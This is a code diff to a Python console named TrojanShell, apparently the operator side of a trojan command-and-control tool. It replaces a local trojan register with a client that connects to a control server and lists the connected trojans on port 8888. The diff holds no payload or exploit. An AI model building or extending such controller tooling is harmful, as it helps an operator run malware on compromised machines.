@@ -4,6 +4,7 @@ from JTShell.util.message import Message
 from trojanlist import TrojanList
 from trojanconnection import TrojanConnection
 from JTShell.util.ansi import Colors
+from serverconnection import FlowControlClient
 import JTShell.util.error as error
 import sys
 
@@ -16,16 +17,13 @@ class TrojanShell(Shell):
         # the default port on which the trojans operate usually
         self.port = 8888
         if supershell is None:
-            self.trojanregister = TrojanRegister()
-            self.trojanlist = TrojanList()
             # updating the shell command prompt
             self.prompt = "\n TrojanControl> "
-            # loading the registered trojans from the save file
-            self.trojanlist.load_registered_trojans("trojans")
-            self.trojanlist.load_available_trojans()
+            # assigning the client to communicate with the FlowControlServer
+            self.client = FlowControlClient()
+            self.client.start()
         elif isinstance(supershell, TrojanShell):
-            self.trojanregister = supershell.trojanregister
-            self.trojanlist = supershell.trojanlist
+            self.client = supershell.client
 
     def run(self):
         """
@@ -33,6 +31,12 @@ class TrojanShell(Shell):
         execute the issued command
         :return: (void)
         """
+        # checking fot the Server status, on default everything should work though
+        if self.client.ping is True:
+            self.client.update()
+            # printing the initial information about the connected trojans
+            print(self.client.get_info_available())
+
         # opening the infinite loop inside of a try statement, so that the SystemExit Exception can be caught
         try:
             while True:
@@ -65,8 +69,7 @@ class TrojanShell(Shell):
                     except error.SyntaxError as e:
                         print(e.message.message)
         except SystemExit:
-            self.trojanregister.clear()
-            # self.trojanlist.save_registered_trojans()
+            pass
 
 
 class TrojanRegister:
@@ -164,8 +167,3 @@ class TrojanRegister:
                 self.name_dict[item].terminate()
                 del self.name_dict[item]
                 del self.ip_dict[item]
-
-
-
-
-
